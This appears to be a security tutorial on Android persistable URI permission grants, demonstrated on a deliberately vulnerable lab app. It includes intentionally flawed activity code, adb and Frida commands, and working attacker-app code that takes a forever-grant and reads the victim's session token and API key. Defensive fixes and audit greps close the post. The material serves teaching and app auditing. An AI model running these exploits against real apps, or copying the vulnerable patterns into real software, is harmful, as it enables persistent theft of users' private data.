A **URI permission grant** is a temporary, single-URI permission attached to an Intent. By default an app cannot read another app's `ContentProvider`; the grant is the controlled exception. When an app starts a component with a `content://` URI in the intent's data and the flag `FLAG_GRANT_READ_URI_PERMISSION`, the system gives the *receiving* component read access to *that one URI* on the *granting* app's provider and nothing else. It is how a gallery lets a photo editor open one picture without exposing the whole library.

Three properties make it safe in normal use: it is **scoped** (one URI, not the provider), **directional** (app A grants app B access to a URI on A's provider), and **temporary** by default the grant ends when the receiving component's task finishes. This post is about apps that remove that last property.

<br>**Where persistable grants are used normally**

Some features need the grant to outlive the task. The Storage Access Framework's "pick a file" is the standard one: the user picks a document once, and the app wants to re-open it next week without re-prompting. For that, two things happen:

1. The granting intent **offers** durability with `FLAG_GRANT_PERSISTABLE_URI_PERMISSION` (value `0x40`) alongside the read flag.
2. The receiving app **takes** it: `getContentResolver().takePersistableUriPermission(uri, flags)`.

Once taken, the grant is written to `/data/system/urigrants.xml` and survives the task finishing, the app being killed, the user signing out, and a reboot. There is no user-facing UI to revoke it on stock Android. That is by design for the document-picker case and it is the longest-lived permission one app can hold on another app's data.

<br>**Where it goes wrong**

A grant always reads *"package A grants package B read access to a URI on A's provider."* Keep that direction straight and the two vulnerable shapes fall out.

**Direction A - the app *takes* a grant on someone else's URI.** An exported component reads a URI from the intent and calls `takePersistableUriPermission` without checking where it points. An attacker hands it `content://com.attacker.app.evil/evil` (a provider the attacker app owns) with the persistable flag offered, and the victim app persists a forever-read on the *attacker's* provider. Every later read of that URI, a background sync, a "recent files" refresh — pulls **attacker-controlled data** into the victim's own ingestion path. This is what VulnLabApp demonstrates.

**Direction B - the app *gives* a grant on its OWN private provider.** An exported component fires or returns an intent whose data is `content://com.victim.app.private/…` with read + persistable flags. The caller (the attacker) takes it and reads the victim's **private provider forever** — its database, tokens, files. This is the higher-impact, more commonly reported case: permanent theft of the victim's data with no continued attacker action.

The vulnerable manifest declaration is the same for both — an exported component with `grantUriPermissions`:

```xml
<activity android:name=".activities.ProviderGrantActivity"
    android:exported="true"
    android:grantUriPermissions="true" />
```

And VulnLabApp's activity (Direction A) persists whatever URI it is handed:

```java
Uri dataUri = intent.getData();
if (dataUri == null) dataUri = intent.getParcelableExtra("uri");
if (dataUri == null) return;

try {
    // VULN: takePersistableUriPermission with no allowlist on the URI's authority
    getContentResolver().takePersistableUriPermission(
        dataUri, Intent.FLAG_GRANT_READ_URI_PERMISSION);
} catch (SecurityException e) {
    Log.e(TAG, "take failed (not offered as persistable?): " + e.getMessage());
}
```

<br>**Identifying it**

Grep the manifest for `grantUriPermissions="true"`, then grep the decompile for `takePersistableUriPermission` and `FLAG_GRANT_PERSISTABLE_URI_PERMISSION` (or its value `0x40`). For Direction B, look for any exported component that puts a `content://` URI pointing at *its own* authority into an intent it sends or returns with those flags.

Runtime confirmation, hook the sink that makes the grant durable:

```javascript
Java.perform(function () {
  const CR = Java.use('android.content.ContentResolver');
  CR.takePersistableUriPermission.overload('android.net.Uri', 'int')
    .implementation = function (uri, flags) {
      console.log('[takePersistable] uri=' + uri + ' flags=0x' + flags.toString(16));
      return this.takePersistableUriPermission(uri, flags);
  };
});
```

The hook is passive - `ProviderGrantActivity` only calls the sink when launched with a URI, so trigger it (no chooser, the activity is directly exported):

```bash
adb shell am start \
    -n com.vulnlab.app/.activities.ProviderGrantActivity \
    -d content://com.attacker.app.evil/evil \
    --grant-read-uri-permission \
    --grant-persistable-uri-permission
```

The hook prints `[takePersistable] uri=…` - the sink is reachable. The take itself fails with `No persistable permission grants found` until the URI points at a provider the attacker actually owns, which is the next step.

<br>**Exploitation - Direction A (feed the app an attacker URI)**

The grant is only offered by the app that **owns** the provider behind the URI - aim `ProviderGrantActivity` at an authority you don't own and the take fails with `No persistable permission grants found`. So the attacker app declares its own provider with `grantUriPermissions`:

```xml
<provider
    android:name=".EvilProvider"
    android:authorities="com.attacker.app.evil"
    android:exported="false"
    android:grantUriPermissions="true" />
```

```java
public class EvilProvider extends ContentProvider {
    @Override public boolean onCreate() { return true; }
    @Override
    public Cursor query(Uri uri, String[] p, String s, String[] a, String o) {
        MatrixCursor c = new MatrixCursor(new String[]{"data"});
        c.addRow(new Object[]{"attacker-controlled-payload"});   // what VulnLabApp later ingests
        return c;
    }
    // getType / insert / update / delete: return null / 0
}
```

Then launch `ProviderGrantActivity` with a URI on that provider and the persistable flag offered:

```java
Intent i = new Intent();
i.setClassName("com.vulnlab.app", "com.vulnlab.app.activities.ProviderGrantActivity");
i.setData(Uri.parse("content://com.attacker.app.evil/evil"));
i.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
         | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION   // offer durability
         | Intent.FLAG_ACTIVITY_NEW_TASK);
startActivity(i);
```

Verify the grant persisted - it is on disk, which is the whole point:

```bash
adb shell cat /data/system/urigrants.xml
```
<img alt="" class="bf jp jq dj" loading="lazy" role="presentation" src="https://raw.githubusercontent.com/nirajkharel/nirajkharel.github.io/master/assets/img/images/provider-grant-uri-2.png">

You'll see a `<uri-grant>` with `targetPkg=com.vulnlab.app`, the URI, and `modeFlags` carrying the persistable bit. `adb reboot`, re-read the file — it is still there.

<br>**Exploitation — Direction B (steal the victim's provider)**

The give side is where the impact is. VulnLabApp's `ShareSecretActivity` is exported and hands any caller a persistable read grant on its **own** private `SecretProvider` (declared `exported="false"`):

```java
// ShareSecretActivity — VulnLabApp
Uri secret = Uri.parse("content://com.vulnlab.app.secret/token");
Intent result = new Intent();
result.setData(secret);
result.addFlags(Intent.FLAG_GRANT_READ_URI_PERMISSION
              | Intent.FLAG_GRANT_PERSISTABLE_URI_PERMISSION);   // VULN: persistable
setResult(RESULT_OK, result);
finish();
```

Here the grantor is VulnLabApp itself, which owns the provider — so the grant is genuinely offered (no shell-grantor problem). The attacker launches it for a result, takes the grant, and reads the secret on its own schedule, forever:

```java
// attacker MainActivity
@Override protected void onCreate(Bundle b) {
    super.onCreate(b);
    startActivityForResult(new Intent().setClassName(
        "com.vulnlab.app", "com.vulnlab.app.activities.ShareSecretActivity"), 1);
}

@Override protected void onActivityResult(int req, int res, Intent data) {
    Uri granted = data.getData();
    getContentResolver().takePersistableUriPermission(   // make it durable
        granted, Intent.FLAG_GRANT_READ_URI_PERMISSION);
    InputStream is = getContentResolver().openInputStream(granted);
    String stolen = new java.util.Scanner(is).useDelimiter("\\A").next();
    Log.d("HIJACK", "STOLEN:\n" + stolen);   // victim's token + api_key, even after reboot
}
```

```bash
adb shell am start -n com.attacker.app/.MainActivity
adb logcat -d | grep -iE "HIJACK|VulnSecretProvider"      # HIJACK: STOLEN: session_token=… api_key=…
adb shell cat /data/system/urigrants.xml   # sourcePkg=com.vulnlab.app targetPkg=com.attacker.app
```

Impact:

- **Direction A (take):** the victim app ingests attacker data forever - poisoned profile, malicious config, a payload into whatever parses the URI. Severity depends on what it does with the bytes.
- **Direction B (give):** permanent read of the victim's private provider - DB rows, tokens, files - from an external app, no further interaction. Critical-tier.

<br>**The persistence angle**

The grant survives task death, app kill, sign-out, and reboot because it lives in `/data/system/urigrants.xml`. Android caps how many persisted grants an app can hold, but the attacker needs only one, and there is no revoke UI on stock Android. The one thing that clears it: uninstalling the **grantee** app drops its grants (keyed by package + user, not restored on reinstall) — so for Direction B the attacker keeps their app installed.

<br>**Defence**

Allowlist the authority before persisting, and never offer persistable grants on a private provider to an untrusted caller:

```java
Uri dataUri = intent.getData();
if (dataUri == null) return;
if (!"com.vulnlab.app.fileprovider".equals(dataUri.getAuthority())) {
    throw new SecurityException("untrusted URI authority: " + dataUri.getAuthority());
}
getContentResolver().takePersistableUriPermission(
    dataUri, Intent.FLAG_GRANT_READ_URI_PERMISSION);
```

For Direction B: don't add `FLAG_GRANT_PERSISTABLE_URI_PERMISSION` to anything reachable by an untrusted caller, scope grants to the narrowest URI, and `revokeUriPermission` when the feature is done.

<br>**Closing**

URI grants let one app read one of another app's files without tearing down the sandbox — temporary by design, which is what keeps them safe. Persistable grants remove the timer, and with it the safety. The bug has two faces: an app that *takes* a forever-grant on a URI you control ingests your data forever; an app that *gives* a forever-grant on its own provider hands you its data forever. Grep `grantUriPermissions="true"` and `takePersistableUriPermission` in every manifest you audit — especially banking, healthcare, and document-management apps.
